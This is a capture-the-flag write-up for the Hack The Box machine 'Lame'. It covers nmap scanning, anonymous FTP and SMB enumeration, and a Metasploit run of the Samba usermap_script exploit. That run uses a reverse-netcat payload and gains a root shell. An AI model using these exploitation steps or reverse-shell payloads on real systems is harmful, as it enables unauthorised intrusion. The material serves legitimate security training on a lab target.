# [Lame](https://app.hackthebox.com/machines/Lame)

## Overview

- Linux machine
- Easy

## Scan

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -Pn 10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 06:34 EST
Nmap scan report for 10.10.10.3
Host is up (0.22s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 2h31m05s, deviation: 3h32m09s, median: 1m04s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-02-20T06:35:38-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 66.17 seconds
```

## Quick questions

1. What is ssh-hostkey?

    A host key is a cryptographic key used for authenticating computers in the SSH protocol

2. What is netbios-san?

    is a network service that enables applications on different computers to communicate with each other across a local area network (LAN)

3. What is microsoft-ds?

    Microsoft-DS is the name given to port 445 which is used by SMB (Server Message Block).

## Analysis

1. FTP

    - version: vsFTPd 2.3.4
    - allows anonymous login:

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ ftp 10.10.10.3
    Connected to 10.10.10.3.
    220 (vsFTPd 2.3.4)
    Name (10.10.10.3:kali): anonymous
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls -a
    229 Entering Extended Passive Mode (|||58500|).
    150 Here comes the directory listing.
    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
    226 Directory send OK.
    ftp> pwd
    Remote directory: /
    ftp> 
    ```

    - gg search vulnerabilities: [VSFTPD v2.3.4 Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

2. SMB

    - version: OS: Unix (Samba 3.0.20-Debian)

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ smbclient -L 10.10.10.3                      
    Password for [WORKGROUP\kali]:
    Anonymous login successful

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    tmp             Disk      oh noes!
    opt             Disk      
    IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
    ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
    Reconnecting with SMB1 for workgroup listing.
    Anonymous login successful

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    WORKGROUP            LAME

    ```

    - gg search vulnerabilities: [Samba "username map script" Command Execution](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

## Exploit

just use the [Samba "username map script" Command Execution](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) module in msfconsole and get the flag:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.42.132   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 1 opened (10.10.14.2:4444 -> 10.10.10.3:33741) at 2023-02-20 09:21:27 -0500

whoami
root
```
